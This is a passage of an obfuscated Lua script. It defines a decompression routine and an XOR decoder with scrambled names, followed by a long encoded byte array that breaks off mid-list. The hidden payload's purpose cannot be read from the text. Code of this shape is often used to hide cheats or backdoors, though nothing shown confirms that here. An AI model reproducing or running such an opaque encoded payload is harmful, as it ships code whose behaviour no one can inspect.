
local _LZDl1lIIlOl_318=function(data)
local r=""
local i=1
while i<=#data do
local b=data[i]
if b==0 then
local dist=data[i+1]
local len=data[i+2]
local start=#r-dist+1
for j=1,len do
r=r..r:sub(start,start)
start=start+1
end
i=i+3
elseif b==1 then
r=r..string.char(data[i+1])
i=i+2
else
r=r..string.char(b)
i=i+1
end
end
return r
end

local _XDIlIlOO_319=function(data,key)
local r={}
for i=1,#data do
local k=(key+((i-1)%17)+math.floor((i-1)/23))%256
r[i]=bit32.bxor(data[i],k)
end
return r
end
local _CDI0101O0_320={176,185,252,238,242,254,234,246,207,207,130,139,141,133,202,200,203,249,245,186,196,221,217,174,145,205,206,146,237,234,249,151,149,217,153,136,152,240,157,184,145,201,199,130,196,197,203,194,136,200,196,254,155,149,152,176,207,204,192,193,198,237,193,134,211,192,204,196,186,238,248,234,234,210,207,130,215,214,208,195,135,205,169,136,168,155,152,153,158,197,171,226,147,235,201,239,203,152,197,198,228,243,173,160,188,167,150,152,148,229,230,224,159,144,159,147,156,152,239,173,171,189,160,34,171,230,164,36,165,151,231,224,155,155,172,43,158,172,157,210,199,215,201,192,210,198,220,200,200,199,201,133,213,227,179,219,254,253,163,180,172,154,138,152,233,239,156,156,152,154,174,226,152,148,144,150,144,150,230,138,133,245,244,197,192,203,213,216,156,162,125,169,165,60,160,198,192,198,171,53,168,174,138,179,206,196,213,164,141,181,167,30,173,215,171,31,167,235,226,255,254,145,206,234,235,201,151,248,155,148,204,172,36,162,175,22,190,178,145,168,244,148,151,167,152,170,227,199,229,242,154,146,176,215,176,211,214,202,222,222,136,200,170,222,175,173,163,167,152,197,192,198,198,141,133,201,218,137,209,214,172,89,166,229,129,254,131,130,133,148,201,202,151,152,246,159,150,132,173,19,164,135,138,133,130,128,147,166,24,173,128,170,121,175,173,151,167,255,129,178,139,176,135,239,151,231,246,156,150,148,155,150,157,137,177,230,186,180,248,181,166,27,171,224,198,156,242,153,146,130,137,130,135,128,130,157,159,146,144,131,154,171,145,166,159,195,128,128,250,133,132,255,232,128,168,220,188,153,159,152,158,151,131,177,199,162,132,181,130,180,212,197,227,226,192,242,151,175,29,167,133,129,130,140,133,135,184,20,186,154,154,192,228,159,249,254,237,130,132,181,80,161,139,139,138,154,171,220,185,194,224,255,254,131,236,133,132,138,140,141,131,130,154,172,73,164,230,255,177,112,176,216,217,233,134,138,132,143,139,158,157,151,156,155,153,139,129,180,86,186,183,17,186,186,185,191,227,173,220,172,131,140,135,134,140,132,133,128,185,68,177,245,189,34,173,175,230,181,134,142,129,132,131,133,137,139,187,234,183,210,194,158,129,254,251,236,133,128,139,213,209,205,137,137,146,223,198,193,221,153,131,133,129,135,134,155,139,143,186,230,183,209,142,191,125,179,129,178,54,183,181,52,187,143,135,138,132,132,140,140,247,176,51,177,132,180,55,186,248,241,185,78,184,208,141,191,100,194,134,143,132,141,129,128,133,142,185,98,178,208,244,247,143,143,136,177,46,176,141,139,129,139,141,139,136,188,101,180,143,172,193,27,177,223,251,133,182,15,187,128,135,148,157,216,202,174,162,182,170,220,218,149,158,158,152,203,223,207,201,207,208,159,248,242,243,241,141,132,150,210,214,221,154,146,188,171,189,191,48,198,131,151,196,142,182,182,111,186,186,238,191,143,142,130,226,249,241,242,253,135,244,243,244,137,142,130,254,133,141,135,131,246,243,246,128,247,198,93,180,143,253,139,139,143,139,137,254,226,193,245,202,135,244,142,248,136,185,55,190,142,140,131,139,240,241,250,245,245,197,33,207,245,251,242,139,187,161,189,191,152,194,141,138,155,247,244,250,250,140,129,186,160,182,249,190,127,195,142,194,254,198,153,245,251,244,185,29,176,207,189,44,183,178,252,224,225,162,170,180,231,161,244,139,151,159,206,158,219,175,193,208,192,182,235,232,180,188,187,163,212,220,146,222,214,222,179,234,161,173,177,245,245,230,171,178,164,201,148,189,169,184,162,184,182,166,236,182,234,161,224,230,203,177,172,150,150,151,169,236,243,234,225,244,241,238,225,224,202,54,201,206,219,203,181,179,172,227,182,197,203,194,200,6,205,136,136,252,189,113,188,137,173,174,242,140,143,246,151,251,255,203,86,193,171,146,212,241,237,169,241,232,174,245,199,107,193,188,241,205,76,196,191,223,194,240,234,178,248,176,234,163,248,202,144,196,187,225,164,140,192,156,207,151,129,246,136,135,165,202,146,200,251,206,60,220,180,193,155,210,196,57,203,179,201,54,207,204,109,200,173,208,160,205,182,152,173,152,198,179,204,201,223,200,204,185,205,253,209,50,196,233,196,91,197,181,245,187,228,229,191,185,188,166,190,182,252,161,171,165,180,239,170,236,248,254,250,205,59,212,131,133,227,226,175,141,245,198,54,203,254,247,176,252,249,227,226,253,226,255,229,245,233,247,244,228,240,230,255,224,251,226,254,226,253,225,248,228,233,243,235,249,201,201,200,248,225,249,227,225,232,254,235,248,228,197,227,196,200,214,200,244,176,206,135,217,144,148,154,184,229,159,170,142,135,249,250,148,254,245,206,44,221,187,250,212,175,222,215,169,197,201,8,200,236,205,41,203,208,95,222,128,144,229,231,233,248,165,166,130,147,255,247,207,147,221,182,156,228,156,153,158,233,249,128,131,251,147,253,255,252,186,227,211,216,214,214,96,219,217,203,201,130,133,161,145,252,225,253,185,225,156,214,203,219,232,182,202,182,207,254,252,227,187,226,190,227,155,213,200,212,135,234,233,226,204,36,201,189,208,73,209,211,143,214,153,158,151,134,233,239,246,238,239,168,207,171,214,227,157,228,153,215,36,218,147,219,196,207,146,253,250,237,224,254,240,212,188,216,247,189,181,219,60,218,175,243,173,185,165,225,225,250,183,174,184,170,217,84,212,135,221,138,192,141,209,95,221,253,213,237,212,245,217,107,202,241,245,246,206,177,223,252,227,250,254,214,111,212,217,107,213,220,98,211,241,225,163,165,160,186,186,178,248,180,176,184,168,243,191,251,237,213,230,248,242,182,186,177,246,165,189,173,175,169,178,221,50,209,224,201,212,211,17,211,137,144,140,217,66,223,237,177,178,223,61,226,231,239,168,143,247,137,224,156,152,238,228,155,252,130,221,134,131,191,182,248,213,199,212,237,233,158,234,233,239,222,206,226,149,140,161,191,166,166,182,187,217,204,222,236,238,152,233,161,208,226,196,208,167,182,165,177,169,174,219,245,217,233,237,210,216,163,214,228,238,214,166,215,83,218,218,201,217,230,231,166,216,210,161,228,222,209,183,165,182,217,150,223,234,233,157,233,217,225,243,231,149,135,191,165,171,217,132,222,158,156,155,238,161,225,141,224,141,229,245,223,149,236,233,233,229,158,222,93,227,149,155,147,228,103,227,164,148,158,237,232,219,176,217,170,176,224,5,229,228,114,226,222,219,239,236,237,227,220,200,219,177,149,140,128,134,150,229,74,227,168,239,153,232,154,153,222,228,228,128,128,143,228,91,227,161,208,168,157,232,158,220,117,219,224,219,235,213,209,161,163,212,223,233,8,217,182,189,169,182,223,241,231,164,167,161,230,94,237,138,139,135,183,220,100,219,236,209,163,161,227,210,224,150,134,159,233,80,238,157,235,230,238,161,225,74,231,147,132,143,231,6,236,168,175,173,238,228,222,153,228,133,134,136,132,159,231,6,237,219,218,222,168,159,222,20,228,130,141,145,139,144,146,142,134,234,86,233,175,170,155,238,211,225,74,230,133,150,141,231,26,237,216,217,220,217,216,222,114,229,128,138,144,214,212,231,25,237,218,221,168,216,173,239,95,228,147,131,148,131,128,231,182,236,222,217,170,174,175,221,240,243,231,145,227,247,227,208,166,219,168,234,211,233,238,255,243,156,132,150,130,228,6,239,163,208,221,171,217,236,118,234,239,204,242,225,251,233,221,230,177,235,219,234,2,232,158,139,131,149,146,242,84,230,165,166,213,212,221,233,101,232,152,128,159,145,146,242,99,230,162,164,167,162,169,216,234,21,239,131,139,151,132,222,142,212,136,138,133,134,132,201,181,172,170,221,130,223,185,192,187,188,152,171,172,185,219,222,215,203,138,152,128,140,132,152,157,157,212,221,142,207,199,154,140,158,158,158,131,239,214,242,166,186,189,197,199,215,139,132,217,181,216,218,182,133,178,208,148,156,151,244,180,255,173,190,216,234,169,239,162,161,131,185,193,158,194,171,198,206,247,22,238,199,136,148,130,156,199,194,192,198,196,195,194,218,197,205,218,192,234,196,230,129,130,166,156,192,159,189,245,218,244,193,249,197,230,216,219,220,222,220,196,221,197,199,244,222,250,184,200,203,165,219,179,217,222,239,217,252,196,199,193,198,193,219,192,204,250,190,224,221,237,110,244,192,158,194,197,197,191,190,167,205,203,251,111,224,220,221,215,194,192,202,223,198,199,193,248,125,241,180,252,26,238,161,160,175,197,192,243,90,249,194,198,205,204,194,207,208,220,221,239,115,251,164,190,196,197,246,32,251,176,150,178,163,206,220,221,210,216,209,148,129,155,149,131,145,150,148,219,212,253,44,231,189,164,184,195,186,187,188,185,155,200,249,33,255,253,217,252,219,205,138,143,243,26,253,165,163,248,20,254,203,181,205,207,255,0,242,195,198,244,239,242,145,151,139,218,146,193,204,210,206,54,208,149,157,243,202,230,173,145,164,199,203,220,152,144,155,0,223,249,187,189,197,197,199,247,127,250,203,251,120,249,201,61,122,89,195,193,198,168,203,247,114,242,155,215,158,212,254,183,19,96,95,207,145,245,190,242,212,162,203,200,196,253,204,216,0,145,17,97,174,244,179,241,197,204,201,250,132,237,210,156,0,73,46,40,4,26,230,149,247,166,241,203,203,200,253,160,193,45,1,93,25,54,196,246,75,198,211,250,71,224,200,200,255,187,12,100,47,42,43,219,223,215,139,159,143,137,143,144,223,102,41,2,13,1,5,224,241,247,211,246,140,251,219,244,136,0,171,5,49,52,53,6,37,248,167,170,174,151,181,145,207,207,73,49,51,50,4,233,4,61,163,218,250,233,236,214,254,34,3,1,66,11,51,5,138,9,8,127,240,142,154,159,146,154,46,115,103,110,107,115,99,47,8,90,233,250,100,245,205,254,53,14,96,46,102,5,206,14,105,52,55,152,251,58,245,198,255,164,15,2,36,9,123,6,32,2,61,11,99,255,253,176,231,32,96,2,236,7,5,87,15,58,56,61,11,209,231,146,140,255,40,11,54,48,5,166,9,8,214,3,101,99,136,253,170,252,0,79,5,48,60,5,192,18,39,36,11,202,7,200,254,18,13,117,46,104,4,232,15,115,83,98,87,11,225,5,204,255,198,15,2,36,7,41,112,46,8,40,14,54,122,13,231,251,130,32,109,109,96,100,106,39,87,76,82,59,96,68,65,64,182,108,48,51,50,91,54,55,48,8,245,6,99,125,34,33,62,46,40,2,40,3,99,59,88,65,71,59,59,61,61,62,63,33,73,2,40,7,51,93,101,97,125,57,57,34,111,118,96,98,17,42,6,3,29,6,47,90,41,99,109,44,107,46,123,120,116,124,2,230,12,99,46,7,76,12,10,237,8,13,228,20,17,233,20,120,97,125,99,100,53,9,116,26,32,127,107,104,45,78,64,71,74,53,79,72,65,70,102,59,96,97,14,101,20,37,62,96,96,111,56,89,84,92,101,10,172,14,62,70,32,17,184,22,33,57,110,99,126,53,9,132,8,113,13,250,10,57,57,18,188,29,73,80,74,77,103,126,121,117,48,14,6,19,17,190,16,120,36,95,6,66,13,57,37,12,126,10,39,33,38,32,63,60,61,53,108,122,53,52,58,34,37,13,58,6,82,84,64,93,92,95,123,40,56,9,211,8,61,48,56,61,16,6,27,81,20,251,21,116,80,56,10,78,15,13,253,12,34,44,105,72,34,39,75,42,56,127,124,100,104,120,103,96,126,49,18,101,23,21,228,20,48,49,56,40,117,49,47,44,15,64,18,18,232,16,22,158,31,83,83,84,11,49,9,71,64,79,37,33,46,118,124,98,36,42,55,120,100,99,127,38,56,35,41,33,37,56,39,35,62,24,163,31,108,116,101,97,107,47,118,115,127,103,112,54,115,119,25,223,19,88,94,63,71,63,95,125,18,129,23,21,245,20,40,69,47,41,32,46,14,231,21,17,124,22,37,43,36,23,115,8,26,188,31,29,180,12,33,17,61,16,20,190,21,35,46,25,106,20,40,36,50,42,57,16,97,20,19,164,21,121,113,117,26,178,26,29,121,28,17,89,33,34,90,91,121,39,88,24,191,25,44,32,47,31,69,43,101,107,99,113,61,39,62,37,36,56,104,104,111,119,113,71,33,207,0,120,90,122,94,24,110,30,68,40,36,30,255,44,20,17,32,39,37,57,46,47,24,250,4,112,113,87,86,17,17,78,106,76,33,36,22,202,19,58,97,102,33,32,46,31,255,44,124,108,41,110,107,23,231,19,26,192,27,124,112,123,8,16,14,19,36,182,22,38,24,130,11,82,112,84,114,80,16,77,109,35,121,38,39,22,140,21,41,45,40,41,50,45,21,21,34,191,34,37,207,21,121,113,117,26,204,26,29,141,28,32,243,33,18,106,105,110,38,71,44,41,38,45,29,163,26,32,144,33,35,87,32,22,25,23,124,10,43,28,223,29,115,76,126,23,22,36,216,42,16,17,43,32,44,55,45,36,40,31,222,36,69,75,87,38,125,45,25,25,53,24,45,29,50,28,22,28,34,144,39,37,113,35,41,218,1,111,33,105,119,124,75,9,34,128,45,13,14,4,10,11,42,252,13,112,84,46,32,37,39,35,168,38,121,18,16,41,192,39,35,45,44,46,46,12,18,19,35,205,32,39,224,42,42,147,43,28,251,29,46,105,77,109,19,107,108,121,18,17,20,42,213,41,29,7,22,18,77,109,79,20,108,23,39,102,42,101,116,26,29,32,30,52,46,33,238,39,13,121,120,96,0,113,9,95,15,115,35,55,8,126,101,119,36,246,34,39,87,41,27,115,30,24,116,61,127,23,23,103,97,22,17,5,117,41,8,40,74,65,65,64,82,3,127,11,12,81,12,22,77,31,3,2,9,28,30,27,7,18,24,11,35,233,35,39,141,46,75,43,125,46,31,3,0,24,33,251,55,21,106,38,173,43,102,27,43,136,45,25,1,49,231,46,22,28,16,30,19,4,31,42,97,47,45,251,43,86,94,64,34,244,33,105,23,68,102,99,27,44,6,45,29,13,49,98,48,35,207,33,38,213,44,41,139,62,108,29,110,6,116,50,165,55,36,227,37,11,83,41,161,45,29,19,28,47,76,32,3,125,124,20,23,23,25,118,28,31,44,86,34,23,0,3,11,1,24,4,19,19,40,85,44,89,73,93,75,78,68,17,71,93,64,92,90,6,83,90,92,79,11,115,114,70,94,85,87,75,9,21,80,66,73,75,93,67,68,66,13,6,112,28,90,50,199,51,54,94,44,40,156,46,43,178,46,46,147,51,93,109,5,3,53,209,59,12,31,28,29,29,1,25,47,215,63,2,3,4,122,6,6,56,222,42,18,22,28,1,3,30,48,217,55,52,129,49,115,123,11,10,42,157,41,45,150,44,111,7,11,14,52,24,59,55,149,62,59,199,47,114,105,123,121,120,2,2,5,53,71,52,103,10,12,96,9,115,111,26,48,224,49,112,22,104,30,92,17,4,7,100,111,104,45,50,44,0,93,94,122,107,7,14,16,66,18,19,14,14,27,7,0,2,24,30,51,3,36,6,1,124,12,121,14,60,9,45,47,97,32,0,1,4,1,0,114,26,100,22,25,60,249,58,12,6,16,49,133,55,53,226,50,99,57,43,61,97,21,13,6,3,4,49,102,48,5,7,2,27,16,13,9,23,61,50,59,121,5,76,30,51,12,54,26,31,10,14,17,9,11,20,18,23,113,1,10,30,13,1,31,30,24,77,82,94,82,29,76,90,52,52,67,92,19,107,106,126,24,57,242,60,20,21,30,81,47,53,98,70,65,65,80,54,18,48,85,85,88,93,81,31,31,11,11,114,122,123,53,215,52,113,8,101,12,12,0,62,69,69,111,66,201,55,29,0,0,14,1,14,23,9,20,62,124,72,39,35,47,55,81,53,13,58,124,122,11,117,81,82,14,112,14,66,2,71,26,2,7,10,8,57,84,62,60,64,54,63,169,81,115,114,1,115,117,2,56,233,57,59,171,62,18,84,105,65,212,69,102,103,56,11,21,27,58,168,46,61,174,60,44,112,115,67,215,70,117,71,164,52,14,2,3,10,14,18,115,117,66,215,66,35,41,53,72,188,61,10,10,80,114,113,112,64,43,65,67,133,70,115,117,121,21,23,10,28,89,81,63,227,75,112,12,116,41,42,71,234,74,85,115,11,13,97,8,117,124,66,113,84,69,152,67,72,171,78,22,59,173,59,62,217,69,65,210,86,41,119,14,7,6,123,122,114,117,116,97,8,118,65,209,77,125,69,213,68,122,123,120,76,168,48,119,112,113,65,213,64,40,26,113,112,117,120,102,123,76,172,57,62,142,69,29,28,48,42,53,51,58,32,36,44,113,109,91,75,81,35,53,43,44,42,101,110,97,73,51,77,111,111,108,3,2,113,65,56,82,68,60,69,43,36,73,150,72,76,53,76,6,64,57,78,113,112,119,113,126,100,120,125,122,76,53,72,79,131,67,47,43,47,69,240,65,72,201,78,123,32,2,78,170,83,44,65,177,64,124,117,123,118,72,106,66,100,77,206,71,120,96,104,127,126,102,116,100,71,160,78,56,46,56,56,60,33,112,115,96,67,109,76,110,103,38,38,62,107,56,63,59,42,80,195,67,13,10,13,69,157,68,37,21,115,126,77,222,67,102,96,97,106,122,104,125,127,71,199,79,74,186,79,77,140,87,81,222,80,101,11,117,118,118,120,120,21,115,127,112,78,235,84,81,75,90,102,117,119,43,1,37,122,75,146,78,17,119,100,108,82,121,90,85,145,66,71,144,77,55,98,77,193,73,96,111,99,83,221,71,25,118,8,72,116,73,4,76,169,77,122,80,218,94,96,102,102,110,115,100,120,114,125,76,193,92,35,25,96,98,99,29,57,58,87,201,76,124,75,194,66,78,195,83,61,29,83,1,86,58,87,8,75,126,74,196,72,77,99,66,81,195,91,84,219,83,49,57,53,58,47,75,220,92,127,127,31,96,29,83,23,86,58,7,97,98,74,219,64,120,127,123,102,105,126,98,98,109,86,199,94,43,63,58,46,45,58,111,37,63,38,83,43,86,34,37,45,60,122,4,12,24,4,7,127,97,96,82,203,86,9,100,110,2,120,4,106,121,11,10,10,101,115,15,123,116,51,35,57,59,45,51,51,51,109,102,102,80,168,90,110,124,10,9,31,3,34,39,6,117,6,77,71,76,13,82,89,80,85,192,81,105,103,104,91,200,79,111,127,0,25,97,62,99,56,10,111,102,89,206,87,110,110,107,106,121,124,96,99,101,84,193,80,87,142,90,52,91,210,89,94,176,84,81,168,80,27,28,25,103,88,201,89,18,108,2,103,109,93,97,81,170,86,84,170,83,113,89,164,93,92,119,93,95,156,112,30,98,83,149,86,86,85,91,22,107,18,2,103,107,96,159,110,101,103,109,103,100,123,105,107,104,91,162,91,58,48,96,169,106,23,23,101,86,97,91,104,21,91,57,94,107,98,96,31,102,99,75,93,103,103,59,104,21,18,21,109,94,32,99,87,95,99,76,89,85,250,80,112,113,120,121,34,96,124,125,97,141,114,100,225,81,103,87,238,90,109,91,176,81,106,107,84,89,78,82,87,92,85,188,94,46,50,50,48,56,126,57,1,13,17,6,100,232,107,100,59,52,22,54,18,48,94,172,99,88,95,83,100,150,99,103,138,94,63,47,53,63,41,55,48,14,65,61,60,23,18,56,12,61,41,114,114,92,170,89,62,93,62,37,55,100,194,101,86,89,52,89,108,95,110,104,4,66,62,33,32,34,81,84,86,74,52,113,33,38,117,103,57,44,21,0,75,59,54,34,103,251,109,6,54,18,3,111,103,119,27,73,98,80,117,83,83,35,44,89,92,121,1,116,5,125,6,13,13,12,22,101,91,100,64,105,31,97,115,40,113,52,73,65,16,6,16,16,20,9,72,29,49,0,49,92,153,91,118,72,80,83,79,70,86,69,65,64,70,107,102,110,106,115,110,86,72,78,99,149,99,10,20,0,0,12,31,69,87,109,115,81,72,73,82,72,101,9,66,90,93,92,69,92,109,36,93,119,84,85,83,77,74,84,103,60,106,83,82,71,84,87,70,115,85,86,31,99,51,98,20,103,63,108,92,84,85,66,111,80,99,97,9,102,63,71,102,114,110,105,43,111,92,93,110,120,117,85,98,80,103,71,68,103,198,96,66,72,13,72,110,250,118,19,0,12,7,76,82,75,95,64,67,86,81,69,70,0,3,95,17,14,12,7,14,78,78,66,88,90,91,108,28,108,95,113,130,80,99,172,124,74,103,175,110,67,67,108,43,77,94,92,83,66,81,77,76,67,80,65,73,3,13,76,69,70,95,78,64,91,90,84,16,13,3,9,72,105,249,111,12,2,79,47,59,59,66,69,60,44,87,11,39,54,106,247,111,80,110,208,119,10,28,6,93,69,84,80,89,69,94,89,69,109,254,106,22,30,0,83,43,49,53,87,39,5,35,7,35,109,66,106,65,76,67,95,68,85,18,24,103,199,108,106,216,104,109,222,97,65,68,55,65,54,67,85,37,64,54,53,35,64,79,1,4,82,88,82,115,50,114,40,48,34,105,103,111,49,80,49,48,2,5,45,23,17,5,94,119,228,126,15,11,0,30,11,111,238,96,66,60,69,69,26,119,23,122,51,106,202,104,94,110,206,126,71,75,65,89,71,66,76,121,217,125,107,231,110,110,188,119,53,49,115,165,118,118,161,123,74,123,175,111,89,83,1,25,29,114,106,126,71,26,62,55,48,74,123,219,111,109,129,116,68,79,115,95,123,118,158,124,121,240,126,124,78,110,110,231,98,29,61,66,59,60,119,129,122,76,123,248,113,76,92,89,71,70,94,66,69,64,118,243,126,121,178,127,77,64,77,111,180,127,54,48,68,58,70,119,121,122,22,123,190,121,73,127,173,124,64,94,69,117,78,125,21,24,14,19,82,27,18,16,128,104,117,92,70,93,72,75,119,100,122,123,255,120,126,232,137,129,141,117,18,26,17,118,77,123,73,122,89,121,125,216,111,236,203,30,66,68,60,57,70,72,121,154,127,69,125,212,115,181,177,186,114,218,119,69,70,120,208,124,9,25,13,27,30,244,161,247,237,7,29,25,86,3,10,12,31,123,133,121,24,225,236,231,173,199,27,7,19,48,13,16,64,61,21,19,26,57,233,243,241,247,199,29,31,27,28,81,82,36,47,57,78,78,177,177,238,239,205,218,71,79,95,3,72,67,74,81,126,181,139,179,183,183,168,188,176,95,91,80,72,72,75,87,77,87,83,182,185,175,172,173,191,179,94,87,75,83,6,124,85,114,73,183,173,176,180,173,169,217,192,35,48,51,123,51,126,18,19,176,222,177,181,223,167,217,183,190,60,76,57,78,94,32,86,128,155,147,177,182,181,178,177,205,171,36,86,89,14,14,22,22,230,245,160,170,164,234,245,168,137,83,127,32,124,110,118,34,168,181,182,183,168,183,175,171,187,190,163,84,85,125,212,112,168,180,176,174,176,133,242,132,160,161,184,139,235,121,81,79,79,182,173,170,183,178,173,135,165,138,166,163,181,78,86,71,127,36,133,179,186,179,169,134,65,139,162,185,185,164,81,19,30,244,233,172,229,232,234,134,95,140,189,209,169,188,175,32,87,127,214,145,178,176,180,171,182,136,209,142,186,188,180,142,141,123,168,183,169,180,132,104,143,136,37,140,163,187,191,142,24,122,185,176,174,183,176,172,175,174,168,253,226,238,226,173,230,246,160,169,170,131,163,131,228,230,230,237,162,186,160,189,167,178,173,177,129,157,139,233,233,228,233,229,170,212,198,196,193,192,161,161,177,130,70,135,180,183,181,181,137,165,139,245,142,28,147,160,167,181,178,189,133,107,132,168,236,228,239,172,235,225,253,176,206,215,192,203,180,234,235,185,192,195,139,161,136,189,178,160,189,191,162,163,224,234,134,205,129,206,200,190,188,191,227,160,216,254,255,148,207,134,178,186,136,166,154,139,203,137,233,241,252,247,189,215,250,247,227,192,253,224,164,216,248,248,234,219,226,240,241,248,241,231,211,206,178,205,239,248,248,255,225,246,184,184,146,43,190,220,167,182,206,199,185,187,186,194,142,52,147,164,146,40,152,167,166,165,180,187,165,187,190,189,141,51,137,144,192,145,250,252,250,151,110,142,137,79,136,197,196,193,190,217,161,162,162,148,100,149,161,165,185,138,84,137,141,168,136,184,185,163,173,166,149,254,133,169,214,229,187,196,189,189,142,88,149,170,147,243,153,162,166,173,174,162,166,185,188,184,142,232,150,227,247,227,241,244,226,184,236,244,239,139,225,137,252,250,245,145,88,150,183,238,235,170,165,169,154,39,140,140,230,134,176,255,253,231,148,177,147,151,78,136,246,155,0,143,196,199,191,207,160,160,162,149,69,155,174,174,154,73,159,164,141,198,140,144,251,136,187,224,236,230,242,176,168,179,161,160,188,253,251,226,248,252,244,182,149,203,133,244,245,171,155,87,158,215,142,209,147,166,147,94,153,174,160,169,161,170,183,171,165,158,86,137,144,38,145,245,245,249,229,242,153,0,150,216,222,175,208,160,10,146,146,10,144,160,171,167,152,104,159,155,40,154,210,246,232,161,163,163,219,220,201,165,161,172,167,252,253,240,251,165,231,196,229,193,246,230,224,254,251,252,178,196,207,217,174,174,145,145,206,254,147,139,145,190,236,152,75,157,250,243,250,183,145,149,148,143,147,144,150,191,187,176,168,170,174,183,173,183,179,160,166,161,136,188,166,162,188,171,173,154,143,159,189,248,234,206,194,214,202,203,250,181,190,227,180,241,178,156,110,157,235,213,211,204,131,208,254,254,203,151,60,156,179,179,195,218,202,214,161,219,160,149,201,202,166,200,171,175,193,185,195,171,171,219,229,146,149,129,249,137,132,241,244,246,245,233,190,180,182,183,152,146,139,248,134,149,132,250,151,201,209,175,162,156,209,152,148,150,223,143,140,146,159,140,159,161,176,182,155,72,155,236,236,200,200,196,215,141,146,158,158,133,171,154,79,152,172,158,76,163,136,139,131,205,195,134,143,128,153,167,170,156,150,157,235,200,196,204,131,200,202,197,198,196,137,245,208,210,240,241,209,243,239,237,234,200,250,151,149,159,148,170,232,157,254,229,241,237,136,149,151,145,145,150,138,147,128,170,77,169,250,242,236,191,255,229,225,207,237,148,233,238,225,230,155,171,128,159,165,162,145,141,146,131,192,202,166,19,173,169,231,172,224,251,173,174,208,204,145,235,146,251,148,158,158,148,205,202,193,200,148,217,250,212,242,199,209,210,204,197,194,128,129,245,248,233,174,121,156,144,205,206,234,164,133,165,143,211,169,77,186,156,155,234,154,220,149,131,254,140,165,188,182,154,155,154,159,154,232,140,242,156,130,205,162,125,161,135,143,135,168,59,168,172,93,171,244,176,162,169,255,139,149,149,151,139,153,128,129,154,172,88,173,159,135,159,154,154,164,91,165,135,206,220,196,200,216,196,193,193,144,153,198,142,200,141,133,213,205,221,223,217,194,141,218,244,219,236,178,107,166,141,165,202,187,218,169,198,172,132,156,159,156,131,155,159,133,151,216,138,202,201,221,194,133,202,193,193,192,194,153,131,133,129,254,132,151,138,244,170,205,175,158,158,132,131,128,178,221,183,140,142,151,151,129,128,133,130,173,71,235,210,208,220,215,180,82,187,166,182,173,169,79,168,149,149,130,175,180,177,154,152,134,131,155,143,157,154,129,155,172,75,173,157,134,154,128,133,157,181,40,185,155,145,132,171,183,174,174,212,134,201,221,193,180,206,184,183,169,172,169,209,168,157,155,131,137,130,178,67,183,149,208,194,214,218,221,195,196,194,141,134,219,156,218,155,147,198,211,195,205,203,212,138,223,247,198,243,143,213,223,214,147,157,181,111,149,144,136,142,134,157,153,135,134,158,159,237,224,240,181,23,180,136,213,214,242,244,158,148,134,212,152,153,134,140,156,153,133,184,111,185,130,133,129,152,158,175,102,178,128,128,130,153,182,203,187,139,150,142,132,173,184,171,155,136,155,179,181,182,150,222,222,153,146,147,141,150,156,135,141,140,128,154,148,193,222,210,214,153,214,212,223,220,210,142,240,252,231,253,223,253,132,254,241,213,186,235,191,138,131,151,175,160,178,178,91,183,133,249,183,231,189,143,146,188,87,188,192,144,188,144,179,6,179,182,249,189,155,152,197,129,159,156,191,156,179,177,252,184,255,255,254,247,246,214,215,141,244,241,142,159,240,130,130,142,214,220,194,132,138,151,217,196,210,204,151,248,244,246,139,179,114,182,129,134,145,185,76,190,216,210,190,61,200,134,128,252,132,217,255,254,184,13,185,187,136,185,143,130,174,168,174,195,168,190,135,134,212,137,245,139,140,244,143,240,137,240,194,55,199,133,134,132,138,184,136,170,187,46,181,156,187,188,255,254,244,197,107,177,183,31,176,153,153,158,128,131,142,192,102,211,242,245,170,182,81,188,137,186,29,191,142,190,25,206,244,243,245,232,247,247,182,255,187,185,80,187,219,223,211,179,164,194,38,201,129,133,199,139,187,240,186,8,191,189,46,187,244,252,243,196,168,204,199,228,189,185,214,170,243,140,247,143,240,240,194,126,192,243,198,172,196,139,130,130,142,137,190,212,195,246,194,168,194,161,169,199,62,195,246,214,187,83,190,241,192,249,198,195,55,193,241,250,166,160,166,186,198,182,189,35,188,192,190,193,242,245,245,247,164,201,53,200,131,129,189,142,173,192,60,198,195,46,194,138,145,129,249,166,203,252,190,210,142,172,158,240,250,252,248,238,199,36,206,171,165,168,148,140,146,143,233,252,255,245,236,198,123,205,189,184,190,169,237,210,204,191,47,199,194,1,202,137,144,136,200,246,200,253,130,255,190,253,195,248,194,79,193,197,55,206,235,235,232,203,142,201,206,76,175,136,243,138,141,197,176,196,164,134,202,63,207,244,206,59,179,248,242,240,244,243,197,50,203,251,202,63,202,191,171,191,181,161,181,226,182,170,177,198,38,203,201,72,206,204,190,197,159,189,193,123,199,196,32,197,142,151,250,250,251,204,186,203,207,163,212,193,66,192,197,182,214,164,249,202,49,207,205,207,204,143,224,230,240,195,171,201,240,241,251,241,250,224,255,251,251,208,190,212,211,43,192,244,248,199,180,202,202,21,192,137,141,128,208,120,208,229,168,138,170,171,248,201,138,200,255,205,97,195,225,253,227,211,125,194,197,81,206,249,133,251,131,130,254,254,208,72,209,156,212,66,198,247,250,129,167,185,191,173,163,173,181,255,188,182,163,253,254,153,148,140,249,251,250,252,161,206,123,211,227,235,251,175,253,247,161,189,167,169,191,165,162,160,239,248,165,254,184,253,213,38,212,179,189,187,164,235,185,149,164,141,209,67,214,253,253,137,144,140,129,128,202,255,207,205,179,203,227,231,137,246,138,228,229,232,237,255,143,233,145,225,236,163,163,185,187,181,160,247,255,255,233,235,202,76,207,230,255,227,248,233,226,248,228,252,250,255,233,224,238,231,254,244,228,179,227,249,210,254,215,248,226,228,241,245,218,40,204,173,163,170,231,226,232,254,225,237,213,243,219,241,235,234,232,229,226,252,230,249,255,252,211,66,218,231,225,237,217,197,216,238,251,246,207,207,213,254,190,181,161,190,140,250,191,182,180,179,175,239,147,231,231,225,137,241,229,244,138,216,133,222,243,237,229,222,236,201,208,253,209,227,212,158,211,251,236,235,218,146,206,235,230,207,189,210,228,211,245,211,254,226,233,217,120,216,220,68,221,238,248,233,210,120,209,213,237,212,234,217,189,222,220,127,219,132,194,162,209,6,213,137,213,72,212,239,246,219,65,222,247,246,200,193,183,167,189,183,161,191,184,182,249,242,175,240,182,247,192,147,135,166,166,166,187,246,163,131,178,135,251,185,179,186,255,201,201,189,158,133,228,153,231,151,150,234,234,149,237,238,144,191,210,210,210,255,246,155,183,186,189,251,243,230,245,222,3,239,211,214,210,228,191,211,248,187,216,179,223,243,229,232,242,238,201,202,226,241,237,183,174,184,170,241,232,238,237,241,231,235,224,57,230,208,213,229,98,209,136,159,142,146,149,221,8,220,140,141,210,188,215,211,189,244,136,234,217,41,216,234,152,252,130,200,185,193,228,209,226,231,102,220,237,239,247,233,221,5,220,213,212,226,47,236,